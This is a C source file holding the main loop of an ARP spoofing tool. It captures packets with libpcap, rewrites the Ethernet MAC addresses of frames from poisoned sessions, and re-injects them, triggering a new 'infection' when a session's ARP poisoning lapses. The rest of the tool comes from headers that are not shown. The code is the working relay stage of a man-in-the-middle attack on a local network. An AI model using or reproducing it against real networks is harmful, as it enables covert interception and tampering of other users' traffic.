#include "ethernethelper.h"
#include "arphelper.h"
#include "iphelper.h"
#include "tcphelper.h"
#include "udphelper.h"
#include "packetmaker.h" 
#include "packetAnalyzer.h"
#include "arpSpoofer.h" 
 
int main(int argc, char* argv[]) {
	if(basicSetting(argc, argv) == -1){
		printf("basic setting error\n"); 	
		return -1; 
	}

	if(sessionSetting(argc, argv) ==-1){
		printf("session setting error\n"); 
		return -1; 
	}

	while(true){
		struct pcap_pkthdr* header;
	 	const u_char* packet;
	  	pthread_mutex_lock(&mutex); 
		int res = pcap_next_ex(handle, &header, &packet);
		pthread_mutex_unlock(&mutex); 
		if(res == 0) continue;
		if(res == -1 || res == -2){
			printf("error in capturing..\n");
			break;
		}
		else{
			int signum = 0; 
			int result = RelayAnalysis(header, packet, &signum);
			if(result == -1) {
				printf("RELAY >> it's not my work\n"); 
				continue; 
			}
			if(result == -2){
				setSignal(signum); 
				printf("RELAY >> need new Infection in session[%d]\n", signum);
				usleep(100); 
				continue; 
			} 
			memcpy(packet, sessions[result].targetMac, 6);	
			memcpy(packet + 6, mac, 6); 
			printHexValue("RELAY >> relay to new Target : ", sessions[result].targetMac, 6, ':');
			pthread_mutex_lock(&mutex); 
			if(pcap_inject(handle, packet, header->caplen) == header->caplen) 
				printf("RELAY >> relay success\n"); 
			pthread_mutex_unlock(&mutex); 
		 }
		printf("\n"); 
	} 
	pcap_close(handle); 
	return 0; 
}

